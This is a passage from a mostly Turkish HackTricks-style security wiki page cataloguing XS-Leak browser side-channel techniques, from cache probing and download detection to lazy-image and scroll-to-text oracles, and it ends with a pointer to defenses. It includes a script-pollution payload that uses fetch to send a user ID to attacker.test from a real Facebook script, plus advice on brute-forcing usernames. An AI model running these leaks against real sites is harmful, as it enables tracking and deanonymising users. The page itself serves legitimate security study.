- **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Summary:** In Google Chrome, a dedicated error page is displayed when a page is blocked from being embedded on a cross-origin site due to X-Frame-Options restrictions.
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome’da, `X-Frame-Options` header'ı "deny" veya "same-origin" olarak ayarlanmış bir sayfa object olarak embed edildiğinde bir hata sayfası gösterilir. Chrome, iframe veya diğer tarayıcılardan farklı olarak bu object'in `contentDocument` özelliği için `null` yerine boş bir document nesnesi döndürür. Saldırganlar bu boş document'ı tespit ederek, özellikle geliştiriciler hata sayfalarını gözardı edip X-Frame-Options header'ını tutarsız şekilde ayarladıklarında kullanıcının durumu hakkında bilgi sızdırabilir. Bu tür leakleri önlemek için güvenlik header'larının farkındalığı ve tutarlı uygulanması önemlidir.

### Download Detection

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Headers
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Summary:** An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` header'ı, özellikle `Content-Disposition: attachment`, tarayıcıya içeriği inline yerine indirmesini söyler. Bu davranış, kullanıcının bir dosya indirilmesini tetikleyen bir sayfaya erişimi olup olmadığını tespit etmek için kullanılabilir. Chromium tabanlı tarayıcılarda bu indirme davranışını tespit etmek için birkaç teknik vardır:

1. **Download Bar Monitoring**:
- Chromium tabanlı tarayıcılarda bir dosya indirildiğinde tarayıcı penceresinin altında bir download bar görünür.
- Pencere yüksekliğindeki değişiklikleri izleyerek saldırganlar download bar'ın görünmesini çıkarım yapabilir; bu da bir indirme başlatıldığını düşündürür.
2. **Download Navigation with Iframes**:
- Bir sayfa `Content-Disposition: attachment` header'ı ile dosya indirmeyi tetiklediğinde bu bir navigation olayı oluşturmaz.
- İçeriği bir iframe içinde yükleyip navigation olaylarını izleyerek, içeriğin dosya indirmeye neden olup olmadığını (navigation yoksa indirme) kontrol etmek mümkündür.
3. **Download Navigation without Iframes**:
- iframe tekniğine benzer şekilde, bu yöntem iframe yerine `window.open` kullanır.
- Yeni açılan pencerede navigation olaylarını izlemek, dosya indiriminin tetiklenip tetiklenmediğini (navigation yoksa indirme) ortaya çıkarabilir.

Sadece oturum açmış kullanıcıların bu tür indirmeleri tetikleyebildiği senaryolarda, bu teknikler indirme isteğine tarayıcının verdiği yanıta bağlı olarak kullanıcının kimlik doğrulama durumunu dolaylı olarak çıkarım yapmak için kullanılabilir.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Summary:** An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> This is why this technique is interesting: Chrome now has **cache partitioning**, and the cache key of the newly opened page is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, but if I open an ngrok page and use fetch in it, the cache key will be: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, the **cache key is different**, so the cache cannot be shared. You can find more detail here: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Comment from [**here**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Bir site `example.com` bir kaynağı `*.example.com/resource` üzerinden dahil ederse, o kaynak top-level navigation ile doğrudan talep edilmiş gibi aynı caching key'e sahip olur. Bunun nedeni, caching key'inin top-level _eTLD+1_ ve frame _eTLD+1_ bileşenlerinden oluşmasıdır.

Cache'e erişmek bir kaynağı yüklemekten daha hızlı olduğu için, bir sayfanın lokasyonunu değiştirmeyi deneyip 20ms (örneğin) sonra iptal etmek mümkün olabilir. Eğer durdurduktan sonra origin değiştiyse, bu kaynak cache'lenmiş demektir.\
Ya da potansiyel olarak cache'lenmiş sayfaya fetch gönderip geçen süreyi ölçebilirsiniz.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Redirects
- **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Summary:** It's possible to find out if a response to a fetch request is a redirect
- **Code Example**:

![](<../../images/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Summary:** It's possible to try to load a resource and about before it's loaded the loading is interrupted. Depending on if an error is triggered, the resource was or wasn't cached.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Bir kaynağı yüklemeyi denemek ve yüklenmeden önce AbortController ile işlemi iptal etmek için _**fetch**_ ve _**setTimeout**_ kullanın. Bu yöntem hem kaynağın **cached** olup olmadığını tespit etmeye hem de tarayıcı cache'inden belirli bir kaynağı temizlemeye (evict) yarar. Ayrıca süreç yeni içerik cache'lenmeden gerçekleşir.

### Script Pollution

- **Inclusion Methods**: HTML Elements (script)
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Summary:** It's possible to **overwrite built-in functions** and read their arguments which even from **cross-origin script** (which cannot be read directly), this might **leak valuable information**.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

#### Prototype hooks to exfiltrate module-scoped data

Pre-define `Function.prototype.default` and `Function.prototype.__esModule = 1` before loading a module so its `default` export calls your hook (e.g., receives `{userID: ...}`), letting you read module-scoped values without timing or brute force.
```html
<script>
Function.prototype.default=(e)=>{if(typeof e.userID==="string")fetch("//attacker.test/?id="+e.userID)}
Function.prototype.__esModule=1
</script>
<script src="https://www.facebook.com/signals/iwl.js?pixel_id=PIXEL_ID"></script>
```
İstek, script yalnızca kimliği doğrulanmış kullanıcılar için yükleniyorsa kendisi de bir login-state oracle'a dönüşür.

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Dahil Etme Yöntemleri**: Pop-ups
- **Algılanabilir Fark**: Page Content
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Özet:** service workers kullanarak bir web'in yürütme süresini ölçün.
- **Kod Örneği:**

Bu senaryoda, saldırgan kendi domainlerinden biri olan "attacker.com" üzerinde bir **service worker** kaydettirir. Ardından saldırgan, ana dokümandan hedef site üzerinde yeni bir pencere açar ve **service worker**'a bir zamanlayıcı başlatmasını söyler. Yeni pencere yüklenmeye başladıkça, saldırgan önceki adımda elde ettiği referansı **service worker** tarafından yönetilen bir sayfaya yönlendirir.

Önceki adımda başlatılan isteğin ulaşmasıyla birlikte **service worker**, gezinmeyi sona erdiren **204 (No Content)** durum kodu ile yanıt verir. Bu noktada **service worker**, ikinci adımda başlatılan zamanlayıcıdan bir ölçüm alır. Bu ölçüm, gezinme sürecinde gecikmeye neden olan JavaScript süresinden etkilenir.

> [!WARNING]
> Bir execution timing'de **network factors**ı **ortadan kaldırmak** mümkün olabilir ve bu sayede **daha hassas ölçümler** elde edilebilir. Örneğin, sayfanın kullandığı kaynakları sayfayı yüklemeden önce yükleyerek.

### Fetch Timing

- **Dahil Etme Yöntemleri**: Fetch API
- **Algılanabilir Fark**: Timing (generally due to Page Content, Status Code)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Özet:** Bir isteği gerçekleştirme süresini ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Başka clock'lar da kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Dahil Etme Yöntemleri**: Pop-ups
- **Algılanabilir Fark**: Timing (generally due to Page Content, Status Code)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Özet:** `window.open` kullanarak bir isteğin süresini ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Başka clock'lar da kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

### Subdomain probing for identity/login state

- **Dahil Etme Yöntemleri**: HTML Elements (script), Frames
- **Algılanabilir Fark**: DNS/HTTP load success, CORB/header changes
- **Özet:** Eğer tanımlayıcılar alt alan adı etiketlerinde yaşıyorsa (ör. `www.<username>.sb.facebook.com`), aday host'larda kaynak isteğinde bulunun ve `onload` ile `onerror`/zaman aşımı durumlarını Boolean olarak değerlendirin. `/signals/iwl.js` gibi yalnızca girişli kullanıcılar için yüklenen script'lerle birleştirerek kullanıcı adlarını brute-force yapın ve ilişkili özelliklere ilişkin kimlik doğrulamayı doğrulayın.
- **Not:** Signals farklı dahil etme tipleriyle (`script`, `iframe`, `object`) çoğaltılabilir; böylece adaylar için `X-Frame-Options`, `CORB` veya yönlendirme farklarını tespit edebilirsiniz.

## With HTML or Re Injection

Burada cross-origin HTML'den bilgi exfiltrate etmek için kullanılan, HTML **injecting HTML content** tekniklerini bulabilirsiniz. Bu teknikler, herhangi bir nedenle **HTML enjekte edebildiğiniz ancak JS kodu enjekte edemediğiniz** durumlarda özellikle ilgi çekicidir.

### Dangling Markup


{{#ref}}
../dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

Eğer **exfiltrate content** yapmanız gerekiyorsa ve sırrın öncesine HTML ekleyebiliyorsanız, **common dangling markup techniques**'a bakmalısınız.\
Ancak, herhangi bir nedenle bunu **MUST** ile **char by char** yapmanız gerekiyorsa (örneğin iletişim bir cache hit üzerinden gerçekleşiyorsa) bu hileyi kullanabilirsiniz.

**Images** in HTML has a "**loading**" attribute whose value can be "**lazy**". In that case, the image will be loaded when it's viewed and not while the page is loading:
```html
<img src=/something loading=lazy >
```
Bu yüzden yapabileceğiniz şey, **çok sayıda çöp karakter eklemek** (örneğin **binlerce "W"**) veya **gizli içeriğin öncesini web sayfasını doldurmak veya şuna benzer bir şey eklemek:** `<br><canvas height="1850px"></canvas><br>`.\
Sonra örneğin bizim **injection** **flag**'ten önce görünürse, **resim** **yüklenir**, ama **flag**'ten sonra görünürse flag + çöp bunun **yüklenmesini engeller** (ne kadar çöp koymanız gerektiğiyle denemeniz gerekecek). Bu durum [**this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) örneğinde oldu.

Another option would be to use the **scroll-to-text-fragment** if allowed:

#### Scroll-to-text-fragment

Ancak, **bot**'un sayfaya erişmesini şöyle sağlayabilirsiniz:
```
#:~:text=SECR
```
Yani web sayfası şöyle bir şey olacak: **`https://victim.com/post.html#:~:text=SECR`**

Burada post.html, saldırganın gereksiz karakterlerini ve lazy load image'i içerir ve ardından bot'un sırrı eklenir.

Bu metin, bot'un sayfadaki `SECR` içeren herhangi bir metne erişmesini sağlar. Bu metin sır olduğu ve tam olarak **resmin altında** bulunduğu için, **resim yalnızca tahmin edilen sır doğruysa yüklenecektir**. Böylece sırları karakter karakter **exfiltrate** etmek için bir oracle elde ediyorsunuz.

Bunu istismar etmek için bazı kod örnekleri: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Image Lazy Loading Time Based

If it's **not possible to load an external image** that could indicate the attacker that the image was loaded, another option would be to try to **guess the char several times and measure that**. If the image is loaded all the requests would take longer that if the image isn't loaded. This is what was used in the [**solution of this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **burada özetlenmiştir:**

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS


{{#ref}}
../regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

If `jQuery(location.hash)` is used, it's possible to find out via timing i**f some HTML content exists**, this is because if the selector `main[id='site-main']` doesn't match it doesn't need to check the rest of the **selectors**:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection


{{#ref}}
css-injection/
{{#endref}}

## Savunmalar

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ve wiki'nin her bölümünde [https://xsleaks.dev/](https://xsleaks.dev/) önerilen önlemler bulunmaktadır. Bu tekniklere karşı nasıl korunacağınız hakkında daha fazla bilgi için oraya bakın.

## Kaynaklar

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)
- [Cross-Site Leaks (XS-Leaks) across Meta platforms](https://ysamm.com/uncategorized/2026/01/16/cross-site-leaks.html)

{{#include ../../banners/hacktricks-training.md}}
